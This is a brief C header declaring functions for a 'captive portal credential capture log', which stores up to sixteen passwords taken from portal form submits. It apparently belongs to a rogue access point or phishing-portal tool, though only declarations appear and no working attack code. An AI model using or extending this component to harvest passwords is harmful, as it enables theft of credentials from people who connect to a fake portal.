/**
 * Captive portal credential capture log (passwords from form submits).
 */
#pragma once

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

#define WIFI_PORTAL_LOG_MAX 16
#define WIFI_PORTAL_LOG_PW_LEN 48

void wifi_portal_log_add(const char *password);
int wifi_portal_log_count(void);
bool wifi_portal_log_get(int index, char *out, size_t out_len);
uint32_t wifi_portal_log_gen(void);
